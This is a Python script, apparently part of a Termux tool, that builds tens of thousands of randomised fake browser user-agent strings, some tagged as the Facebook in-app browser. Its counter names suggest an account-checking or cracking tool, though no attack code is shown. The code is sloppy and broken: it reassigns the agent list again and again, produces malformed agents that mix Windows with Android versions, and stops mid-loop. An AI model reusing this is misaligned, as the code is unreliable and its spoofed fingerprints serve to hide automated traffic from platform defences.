import os
from bs4 import BeautifulSoup
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from concurrent.futures import ThreadPoolExecutor as ThreadPool 
import uuid,base64,hashlib,zlib,subprocess,time,platform,_socket,ssl,certifi
import bs4,json,sys,time,random,re,subprocess,platform,struct,string,uuid,base64,zlib
from concurrent.futures import ThreadPoolExecutor as tred
from concurrent.futures import ThreadPoolExecutor as ThreadPool
os.system('pkg install espeak')
loop,count,oks,cps,twf,usragent,ugen,okhbros,uas=0,0,[],[],[],[],[],[],[]
y="\x1b[38;5;208m";g="\x1b[38;5;46m";s="\33[38;5;37m";r="\33[38;5;160m";w="\033[1;97m"
import requests, random

ugen = []

gt = random.choice([
    'GT-1015','GT-1020','GT-1030','GT-1035','GT-1040','GT-1045','GT-1050','GT-1240','GT-1440','GT-1450',
    'GT-18190','GT-18262','GT-19060I','GT-19082','GT-19083','GT-19105','GT-19152','GT-19192','GT-19300',
    'GT-19505','GT-2000','GT-20000','GT-200s','GT-3000','GT-414XOP','GT-6918','GT-7010','GT-7020','GT-7030',
    'GT-7040','GT-7050','GT-7100','GT-7105','GT-7110','GT-7205','GT-7210','GT-7240R','GT-7245','GT-7303',
    'GT-7310','GT-7320','GT-7325','GT-7326','GT-7340','GT-7405','GT-7550','GT-8005','GT-8010','GT-810',
    'GT-8105','GT-8110','GT-8220S','GT-8410','GT-9300','GT-93G'
])

windows_versions = [
    "Windows NT 10.0", "Windows NT 6.3", "Windows NT 6.2", 
    "Windows NT 6.1", "Windows NT 5.1"
]

iphone_versions = [
    "iPhone; CPU iPhone OS 13_6 like Mac OS X",
    "iPhone; CPU iPhone OS 12_4 like Mac OS X",
    "iPhone; CPU iPhone OS 11_4 like Mac OS X"
]

chrome_browsers = [str(random.randrange(110, 127))]

for xd in range(10000):
    brand = random.choice(["android","windows","iphone"])

    if brand == "android":
        aa = 'Mozilla/5.0 (Linux; U; Android'
        b = random.choice(['6','7','8','9','10','11','12','13'])
        model = f'TL-tl; {str(gt)}'
        browser = random.choice(chrome_browsers)
        uaku = f'{aa} {b}; {model}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{browser}.0.{random.randrange(4200,4900)}.{random.randrange(40,150)} Mobile Safari/537.36'

    elif brand == "windows":
        win = random.choice(windows_versions)
        browser = random.choice(chrome_browsers)
        uaku = f'Mozilla/5.0 ({win}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{browser}.0.{random.randrange(2000,4500)}.{random.randrange(20,150)} Safari/537.36'

    else: # iPhone
        ios = random.choice(iphone_versions)
        uaku = f'Mozilla/5.0 ({ios}) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0 Mobile/15E148 Safari/604.1'

    ugen.append(uaku)

def windows():
    # Windows 7 / 8.1 / 10 / 11 ke liye full realistic UA generator
    win_versions = [
        "5.1",   # Windows XP
        "6.1",   # Windows 7
        "6.2",   # Windows 8
        "6.3",   # Windows 8.1
        "10.0",  # Windows 10 / 11
    ]

    chrome_main = random.choice(range(80, 127))  # latest stable random versions
    build = random.choice(range(2000, 9999))
    patch = random.choice(range(50, 400))
    safari_version = random.choice(range(530, 539))

    # Different Windows UA Patterns
    A = f"Mozilla/5.0 (Windows; U; Windows NT {random.choice(win_versions)}; en-US) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_main}.0.{build}.{patch} Safari/537.36"
    
    B = f"Mozilla/5.0 (Windows NT {random.choice(win_versions)}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_main}.0.{build}.{patch} Safari/537.36"
    
    C = f"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_main}.0.{build}.{patch} Safari/537.36"
    
    D = f"Mozilla/5.0 (Windows NT {random.choice(win_versions)}; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_main}.0.{build}.{patch} Safari/537.36"

    return random.choice([A, B, C, D])
for agenku in range(10000):
    a = 'Mozilla/5.0 (Linux; Android'
    b = random.choice(['7.0','8.1.0','9','10','11','12','13','14'])
    # More Real Xiaomi Models
    c = random.choice([
        'M2101K6G','M2004J19C','M2003J15SC','M2102J20SI','2201116TG',
        '22041219I','21061119AG','23021RAAEG','23049PCD8G','220733SFG'
    ])
    d = random.choice(list('ABCDEFGHIJKLMNOPQRSTUVWXYZ'))
    e = str(random.randrange(10, 999))
    f = random.choice(list('ABCDEFGHIJKLMNOPQRSTUVWXYZ'))
    
    g = 'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h = str(random.randrange(100, 129))  # Latest browser versions
    i = '0'
    j = str(random.randrange(4000, 9999))
    k = str(random.randrange(40, 300))
    l = 'Mobile Safari/537.36'

    uakuh = f'{a} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uakuh)

for ua in range(10000):
    a = 'Mozilla/5.0 (Linux; Android'
    b = random.choice(['7.1.1','8.0.0','9','10','11','12','13','14','15'])  # updated versions
    y = random.choice([
        'SM-J320H','SM-J3109','SM-J320FN','SM-J320P','SM-J320F','SM-J320G','SM-J320Y',
        'SM-J200F','SM-J210F','SM-J250F','SM-J260G','SM-J400F','SM-J610F'
    ])
    c = 'Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    d = str(random.randrange(110,130))  # Latest Chrome Version
    e = '0'
    f = str(random.randrange(4800,9999))  # Realistic build
    g = str(random.randrange(100,600))
    h = 'Mobile Safari/537.36'

    aalhaj = f"{a} {b}; {y} {c}{d}.{e}.{f}.{g} {h}"
    ugen.append(aalhaj)

for ua in range(5000):
    a = 'Mozilla/5.0 (Linux; Android'
    b = random.choice(['8.0.0','9','10','11','12','13','14','15'])  # Updated Versions
    y = random.choice([
        'SM-J320H','SM-J3109','SM-J320FN','SM-J320P','SM-J320F','SM-J320G','SM-J320Y',
        'SM-J200F','SM-J210F','SM-J250F','SM-J260G','SM-J400F','SM-J610F'
    ])
    c = 'Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    d = random.randrange(110,130)  # Latest Stable Chrome Major Versions
    e = '0'
    f = random.randrange(5000,9999)  # Better Real Build Patterns
    g = random.randrange(100,600)
    h = 'Mobile Safari/537.36'

    alhajb = f"{a} {b}; {y} {c}{d}.{e}.{f}.{g} {h}"
    ugen.append(alhajb)

import random

ugen = []

android_versions = [
    '8', '9', '10', '11', '12', '13', '14', '15'
]

realme_models = [
    'RMX3571','RMX3511','RMX3461','RMX3741','RMP2107','RMX3572',
    'RMX1921','RMX3121','RMX3350','RMX3085','RMX2020','RMX2185'
]

build_ids = [
    'RKQ1.211001.001','TP1A.220905.001','SP1A.210812.016','TQ1A.230105.001',
    'RKQ1.201217.002','QP1A.190711.020'
]

for _ in range(5000):
    a = 'Mozilla/5.0 (Linux; Android'
    b = random.choice(android_versions)
    y = random.choice(realme_models)
    build = random.choice(build_ids)
    c = f'Build/{build}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    d = random.randint(80, 130)      # Chrome major version
    e = random.randint(0, 9)
    f = random.randint(3000, 8999)
    g = random.randint(20, 150)
    h = 'Mobile Safari/537.36'

    ua = f"{a} {b}; {y} {c}{d}.0.{f}.{g} {h}"
    ugen.append(ua)

print(len(ugen))  # Total UA count
print(random.choice(ugen))  # Example UA

import random

ugen = []

android_versions = ['5','6','7','8','9','10','11','12','13','14','15']

tecno_models = [
    'CE8','KG5p','IN6','IN2','CE9','IN1','BD4h','K8','CE7','A571LS','BE8','BD4j','BD3','L6502S','RC6'
]

build_ids = [
    'QP1A.190711.020','RP1A.200720.011','SP1A.210812.016',
    'TQ1A.230105.001','TP1A.220624.014','RKQ1.211001.001'
]

for _ in range(5000):
    a = 'Mozilla/5.0 (Linux; Android'
    b = random.choice(android_versions)
    xs = 'TECNO'
    nx = random.choice(tecno_models)
    build = random.choice(build_ids)

    c = f'Build/{build}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    chrome_major = random.randint(80, 130)
    chrome_minor = random.randint(0, 9)
    chrome_build = random.randint(3000, 9999)
    chrome_patch = random.randint(20, 200)

    h = 'Mobile Safari/537.36'

    ua = f"{a} {b}; {xs} {nx} {c}{chrome_major}.{chrome_minor}.{chrome_build}.{chrome_patch} {h}"
    ugen.append(ua)

print(f"Total User Agents: {len(ugen)}")
print(random.choice(ugen))  # Example preview

import random

def ua():
    ver = str(random.choice(range(85, 131)))  # Chrome main version (real range)
    ver2 = str(random.choice(range(50, 200))) # Patch version random
    return (
        f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
        f"AppleWebKit/537.36 (KHTML, like Gecko) "
        f"Chrome/{ver}.0.0.{ver2} Safari/537.36"
    )

import random

ugen = []

for xd in range(10000):
    a = 'Mozilla/5.0 (Linux; Android'
    b = random.choice(['8.1.0','9','10','11','12','13','14','15'])  # Updated Android versions
    
    # Updated Samsung models (better variation)
    y = random.choice([
        'SM-G960N','SM-G960F','SM-G973F','SM-G975F','SM-G980F',
        'SM-G991B','SM-G996B','SM-G998B','SM-A505F','SM-A715F'
    ])
    
    c = f'{y} Build/QP1A.190711.020; wv)'
    
    d = 'AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    
    e = random.randint(80, 131)  # Latest Chrome actual builds
    f = '0'
    g = random.randint(4100, 6600)
    h = random.randint(50, 200)
    
    # Updated Facebook App Version
    fbv = random.randint(350, 450)
    
    i = f'Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/{fbv}.0.0.24.93;]'
    
    uakuh = f'{a} {b}; {c} {d}{e}.{f}.{g}.{h} {i}'
    ugen.append(uakuh)

print(len(ugen))
print(random.choice(ugen))

import random

ugen = []

for xd in range(10000):
    aa = 'Mozilla/5.0 (Linux; Android'
    
    # Updated Android versions
    b = random.choice(['7.0','8.1.0','9','10','11','12','13','14'])
    
    # More Samsung J Series Models
    c = random.choice(['SM-J610F', 'SM-J701F', 'SM-J530F', 'SM-J730G', 'SM-J250F'])
    
    # Random build suffix letters/numbers
    d = random.choice(list('ABCDEFGHIJKLMNOPQRSTUVWXYZ'))
    e = random.randint(10, 999)
    f = random.choice(list('ABCDEFGHIJKLMNOPQRSTUVWXYZ'))
    
    # Chrome info updated
    g = 'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h = random.randint(80, 131)   # Modern Chrome builds
    i = '0'
    j = random.randint(4100, 6500)
    k = random.randint(50, 200)
    
    l = 'Mobile Safari/537.36'
    
    # Final formatted UA
    uakuh = f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uakuh)

print(len(ugen))
print(random.choice(ugen))

import random

ugen = []

android_versions = ['5.0','6.0','7.0','8.1.0','9','10','11','12','13','14']
tecno_models = ['LE2113','LE2120','LE2125','LE2130','LE2150']

for xd in range(10000):
    aa = 'Mozilla/5.0 (Linux; U; Android'
    b = random.choice(android_versions)
    c = random.choice(tecno_models)
    
    # Random build letters/numbers
    d = random.choice(list('ABCDEFGHIJKLMNOPQRSTUVWXYZ'))
    e = random.randint(1, 999)
    f = random.choice(list('ABCDEFGHIJKLMNOPQRSTUVWXYZ'))
    
    g = 'AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    
    # Realistic Chrome version
    h = random.randint(80, 131)
    i = '0'
    j = random.randint(4100, 6500)
    k = random.randint(50, 200)
    
    l = 'Mobile Safari/537.36'
    
    # Final UA string
    uakuh = f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uakuh)

print(len(ugen))
print(random.choice(ugen))

import random

ugen = []

android_versions = ['6','7','8','9','10','11','12','13','14']
realme_models = [
    'en-us; RMX1925 Build/QKQ1.200209.002;',
    'en-us; RMX1911 Build/QKQ1.191214.002;',
    'en-us; RMX1941 Build/QKQ1.200204.002;',
    'en-us; RMX1851 Build/QKQ1.200209.002;',
    'en-us; RMX1831 Build/QKQ1.200209.002;'
]

for xd in range(10000):
    aa = 'Mozilla/5.0 (Linux; U; Android'
    b = random.choice(android_versions)
    c = random.choice(realme_models)
    
    # Random build characters
    d = random.choice(list('ABCDEFGHIJKLMNOPQRSTUVWXYZ'))
    e = random.randint(10, 999)
    f = random.choice(list('ABCDEFGHIJKLMNOPQRSTUVWXYZ'))
    
    g = 'AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    
    # Modern Chrome Version
    h = random.randint(80, 131)
    i = '0'
    j = random.randint(4100, 6500)
    k = random.randint(50, 200)
    
    # HeyTapBrowser
    l = 'Mobile Safari/537.36 HeyTapBrowser/45.7.0.0'
    
    uakuh = f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uakuh)

print(len(ugen))
print(random.choice(ugen))

import random

ugen = []

for xd in range(5000):
    aa = random.choice([
        'Mozilla/5.0 (Linux; U; Android',
        'Mozilla/5.0 (Linux; Android 6.0.1;',
        'Mozilla/5.0 (Linux; Android 10; SM-G980F Build/QP1A.190711.020; wv)',
        'Mozilla/5.0 (Linux; Android 12; SM-S906N Build/QP1A.190711.020; wv)'
    ])

    b = random.choice(['6.0.1', '7.0', '8.1.0', '9', '10', '11', '12', '13'])

    c = random.choice([
        ' en-us; GT-',
        '; SM-G996U Build/QP1A.190711.020; wv',
        '; Pixel 6 Build/SD1A.210817.023; wv',
        '; SM-G935S Build/MMB29K; wv'
    ])

    d = random.choice(list('ABCDEFGHIJKLMNOPQRSTUVWXYZ'))
    e = str(random.randint(10, 999))
    f = random.choice(list('ABCDEFGHIJKLMNOPQRSTUVWXYZ'))

    g = 'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h = str(random.randint(73, 120))
    i = str(random.randint(0, 9))
    j = str(random.randint(4200, 5800))
    k = str(random.randint(40, 200))

    l = random.choice([
        'Mobile Safari/537.36',
        'Version/4.0 Mobile Safari/537.36',
        'Mobile Safari/537.36;]'
    ])

    uaku2 = f'{aa} {b}{c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)

import random

ugen = []

for agent in range(10000):
    aa = random.choice([
        'Mozilla/5.0 (Linux; Android 6.0.1;',
        'Mozilla/5.0 (Linux; U; Android',
        'Mozilla/5.0 (Linux; Android 12; SM-S906N Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.119 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 10; SM-G996U Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 10; SM-G980F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.96 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 8.0.0; SM-G960F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36'
    ])

    b = random.choice(['6','7','8','9','10','11','12'])
    c = 'en-us; 10; T-Mobile myTouch 3G Slide Build/'
    d = random.choice(list('ABCDEFGHIJKLMNOPQRSTUVWXYZ'))
    e = str(random.randint(1, 999))
    f = random.choice(list('ABCDEFGHIJKLMNOPQRSTUVWXYZ'))

    g = 'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.99'
    h = str(random.randint(73, 100))
    i = '0'
    j = str(random.randint(4200, 4900))
    k = str(random.randint(40, 150))
    l = 'Mobile Safari/533.1'

    fullagnt = f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(fullagnt)

 
import random

ugen = []

for xd in range(10000):
    # First type of UA
    aa = random.choice([
        'Mozilla/5.0 (Symbian/3; Series60/',
        'Mozilla/5.0 (Linux; U; Android',
        'Mozilla/5.0 (Linux; Android 6.0.1;',
        'Mozilla/5.0 (Linux; Android 12; SM-S906N Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.119 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 10; SM-G996U Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 10; SM-G980F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.96 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 8.0.0; SM-G960F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36'
    ])
    b = random.randrange(1, 9)
    c = random.randrange(1, 9)
    d = random.choice([
        'Nokia',
        'Mozilla/5.0 (Linux; Android 7.1.1; G8231 Build/41.2.A.0.219; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 10; Google Pixel 4 Build/QD1A.190821.014.C2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.108 Mobile Safari/537.36'
    ])
    e = random.randrange(100, 9999)
    g = random.randrange(1, 9)
    h = random.randrange(1, 4)
    i = random.randrange(1, 4)
    j = random.randrange(1, 4)
    k = 'Mobile Safari/535.1'

    uaku = f'{aa}{b}.{c} {d}{e}{g}.{h}.{i}.{j} {k}'
    ugen.append(uaku)

    # Second type of UA
    aa2 = random.choice([
        'Mozilla/5.0 (Linux; U; Android',
        'Mozilla/5.0 (Linux; Android 6.0.1;',
        'Mozilla/5.0 (Linux; Android 12; SM-S906N Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.119 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 10; SM-G996U Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 10; SM-G980F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.96 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 8.0.0; SM-G960F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36'
    ])
    b2 = random.choice(['6','7','8','9','10','11','12'])
    c2 = ' en-us; GT-'
    d2 = random.choice(list('ABCDEFGHIJKLMNOPQRSTUVWXYZ'))
    e2 = random.randrange(1, 999)
    f2 = random.choice(list('ABCDEFGHIJKLMNOPQRSTUVWXYZ'))
    g2 = 'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h2 = random.randrange(73, 100)
    i2 = '0'
    j2 = random.randrange(4200, 4900)
    k2 = random.randrange(40, 150)
    l2 = 'Mobile Safari/537.36'

    uaku2 = f'{aa2} {b2}; {c2}{d2}{e2}{f2}) {g2}{h2}.{i2}.{j2}.{k2} {l2}'
    ugen.append(uaku2)

 
import random

ugen = []

for agenku in range(10000):
    a = 'Mozilla/5.0 (Linux; Android'
    b = random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
    c = random.choice(['M2006C3MII'])
    d = random.choice(list('ABCDEFGHIJKLMNOPQRSTUVWXYZ'))
    e = random.randrange(1, 999)
    f = random.choice(list('ABCDEFGHIJKLMNOPQRSTUVWXYZ'))
    g = 'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h = random.randrange(80, 103)
    i = '0'
    j = random.randrange(4200, 4900)
    k = random.randrange(40, 150)
    l = 'Mobile Safari/537.36'
    
    uakuh = f'{a} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uakuh)

# Example output check
for _ in range(5):
    print(random.choice(ugen))

import random

ugen = []

for xd in range(10000):  
    a = 'Mozilla/5.0 (Linux; Android'
    b = random.choice(['8.1.0','9','10','11','12','13'])
    c = 'Redmi Note 9 Pro Build/QKQ1.191215.002; wv)'
    d = 'AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    e = random.randrange(73, 100)
    f = '0'
    g = random.randrange(4200, 4900)
    h = random.randrange(40, 150)
    i = 'Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/399.0.0.24.93;]'
    
    uakuh = f'{a} {b}; {c} {d}{e}.{f}.{g}.{h} {i}'
    ugen.append(uakuh)

# Check 5 random user agents
for _ in range(5):
    print(random.choice(ugen))

import random

ugen = []

for xd in range(10000): 
    aa = 'Mozilla/5.0 (Linux; U; Android'
    b = random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
    c = random.choice(['801SO'])
    d = random.choice(list('ABCDEFGHIJKLMNOPQRSTUVWXYZ'))
    e = random.randrange(1, 999)
    f = random.choice(list('ABCDEFGHIJKLMNOPQRSTUVWXYZ'))
    g = 'AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    h = random.randrange(80, 103)
    i = '0'
    j = random.randrange(4200, 4900)
    k = random.randrange(40, 150)
    l = 'Mobile Safari/537.36 OPR/63.0.2254.62069'

    uakuh = f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uakuh)

# Test print 5 random user agents
for _ in range(5):
    print(random.choice(ugen))

import random

ugen = []

for xd in range(10000):   
    a = 'Mozilla/5.0 (Linux; Android'
    b = random.choice(['8.1.0','9','10','11','12','13'])
    c = 'SM-G960N Build/QP1A.190711.020; wv)'
    d = 'AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    e = random.randrange(73, 100)
    f = '0'
    g = random.randrange(4200, 4900)
    h = random.randrange(40, 150)
    i = 'Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/399.0.0.24.93;]'

    uakuh = f'{a} {b}; {c} {d}{e}.{f}.{g}.{h} {i}'
    ugen.append(uakuh)

# Test print 5 random user agents
for _ in range(5):
    print(random.choice(ugen))

import random

ugen = []

for xd in range(10000):
    aa = 'Mozilla/5.0 (Linux; Android'
    b = random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
    c = 'SM-J610F'
    d = random.choice([chr(i) for i in range(65, 91)])  # A-Z
    e = random.randrange(80, 106)
    f = random.choice([chr(i) for i in range(65, 91)])  # A-Z
    g = 'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h = random.randrange(80, 103)
    i = '0'
    j = random.randrange(4200, 4900)
    k = random.randrange(40, 150)
    l = 'Mobile Safari/537.36'

    uakuh = f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uakuh)

# Test print 5 random user agents
for _ in range(5):
    print(random.choice(ugen))

import random

ugen = []

for xd in range(10000):
    aa = 'Mozilla/5.0 (Linux; Android 12;'
    b = random.choice(['7.0','8.1.0','9','10','11','12'])
    c = random.choice(['2201116PG'])
    d = random.choice([chr(i) for i in range(65, 91)])  # A-Z
    e = random.randrange(1, 999)
    f = random.choice([chr(i) for i in range(65, 91)])  # A-Z
    g = 'AppleWebKit/537.36 (KHTML, like Gecko)'
    h = random.randrange(80, 103)
    i = '0'
    j = random.randrange(4200, 4900)
    k = random.randrange(40, 150)
    l = 'Chrome/107.0.0.0 Mobile Safari/537.36'

    uaku2 = f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)

# Test print 5 random user agents
for _ in range(5):
    print(random.choice(ugen))

import random

ugen = []

for xd in range(10000):  
    aa = 'Mozilla/5.0 (Linux; Android 11;'
    b = random.choice(['7.0','8.1.0','9','10','11','12'])
    c = random.choice(['Infinix X688B'])
    d = random.choice([chr(i) for i in range(65, 91)])  # A-Z
    e = random.randrange(1, 999)
    f = random.choice([chr(i) for i in range(65, 91)])  # A-Z
    g = 'AppleWebKit/537.36 (KHTML, like Gecko)'
    h = random.randrange(80, 103)
    i = '0'
    j = random.randrange(4200, 4900)
    k = random.randrange(40, 150)
    l = 'Chrome/107.0.0.0 Mobile Safari/537.36'

    uaku2 = f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)

# Test print 5 random user agents
for _ in range(5):
    print(random.choice(ugen))

import random

ugen = []

for xd in range(10000):
    aa = 'Mozilla/5.0 (Windows NT 10.0;'
    b = random.choice(['7.0','8.1.0','9','10','11','12'])
    c = 'Win64; x64'
    d = random.choice([chr(i) for i in range(65, 91)])  # Random A-Z
    e = random.randrange(1, 999)
    f = random.choice([chr(i) for i in range(65, 91)])  # Random A-Z
    g = 'AppleWebKit/537.36 (KHTML, like Gecko)'
    h = random.randrange(80, 103)
    i = '0'
    j = random.randrange(4200, 4900)
    k = random.randrange(40, 150)
    l = 'Chrome/107.0.0.0 Mobile Safari/537.36'

    uaku2 = f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)

# Test print 5 random user agents
for _ in range(5):
    print(random.choice(ugen))

import random

ugen = []

for xd in range(10000):
    aa = 'Mozilla/5.0 (Series40;'
    b = random.choice(['7.0','8.1.0','9','10','11','12'])
    c = 'Nokia2000/11.95;'
    d = random.choice([chr(i) for i in range(65, 91)])  # Random A-Z
    e = random.randrange(1, 999)
    f = random.choice([chr(i) for i in range(65, 91)])  # Random A-Z
    g = 'Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401'
    h = random.randrange(80, 103)
    i = '0'
    j = random.randrange(4200, 4900)
    k = random.randrange(40, 150)
    l = 'S40OviBrowser/2.2.0.0.36'

    uaku2 = f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)

# Test print 5 random user agents
for _ in range(5):
    print(random.choice(ugen))

import random

ugen = []

for xd in range(10000):
    aa = 'Mozilla/5.0 (Linux; Android 8.1.0;'
    b = random.choice(['7.0','8.1.0','9','10','11','12'])
    c = 'ASUS_Z01QD'
    d = random.choice([chr(i) for i in range(65, 91)])  # Random A-Z
    e = random.randrange(1, 999)
    f = random.choice([chr(i) for i in range(65, 91)])  # Random A-Z
    g = 'AppleWebKit/537.36 (KHTML, like Gecko)'
    h = random.randrange(80, 103)
    i = '0'
    j = random.randrange(4200, 4900)
    k = random.randrange(40, 150)
    l = 'Chrome/72.0.3626.76 Mobile Safari/537.36'

    uaku2 = f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)

# Test: Print 5 random user agents
for _ in range(5):
    print(random.choice(ugen))

import random

ugen = []

for xd in range(10000):
    aa = 'Mozilla/5.0 (Linux; Android 9;'
    b = random.choice(['7.0','8.1.0','9','10','11','12'])
    c = 'PortalTV'
    d = random.choice([chr(i) for i in range(65, 91)])  # Random A-Z
    e = random.randrange(1, 999)
    f = random.choice([chr(i) for i in range(65, 91)])  # Random A-Z
    g = 'AppleWebKit/537.36 (KHTML, like Gecko)'
    h = random.randrange(80, 103)
    i = '0'
    j = random.randrange(4200, 4900)
    k = random.randrange(40, 150)
    l = 'Chrome/85.0.4183.120 Mobile Safari/537.36'

    uaku2 = f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)

# Example: Print 5 random user agents to verify
for _ in range(5):
    print(random.choice(ugen))

import random

ugen = []

for xd in range(10000):
    aa = 'Mozilla/5.0 (Linux; Android 9;'
    b = random.choice(['7.0','8.1.0','9','10','11','12'])
    c = random.choice(['PortalTV Build/PKQ1.190408.001; wv'])
    d = random.choice([chr(i) for i in range(65, 91)])  # Random letter A-Z
    e = random.randrange(1, 999)
    f = random.choice([chr(i) for i in range(65, 91)])  # Random letter A-Z
    g = 'AppleWebKit/537.36 (KHTML, like Gecko)'
    h = random.randrange(80, 103)
    i = '0'
    j = random.randrange(4200, 4900)
    k = random.randrange(40, 150)
    l = 'Version/4.0 Chrome/78.0.3904.96 Mobile Safari/537.36'

    uaku2 = f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)

# Verify: Print 5 random user agents
for _ in range(5):
    print(random.choice(ugen))

import random

ugen = []

for xd in range(10000):
    aa = 'Mozilla/5.0 (Linux; Android 5.1;'
    b = random.choice(['7.0','8.1.0','9','10','11','12'])
    c = random.choice(['GT-810 Build/LMY47I'])
    d = random.choice([chr(i) for i in range(65, 91)])  # Random letter A-Z
    e = random.randrange(1, 999)
    f = random.choice([chr(i) for i in range(65, 91)])  # Random letter A-Z
    g = 'AppleWebKit/537.36 (KHTML, like Gecko)'
    h = random.randrange(80, 103)
    i = '0'
    j = random.randrange(4200, 4900)
    k = random.randrange(40, 150)
    l = 'Chrome/66.0.3359.106 Safari/537.36'

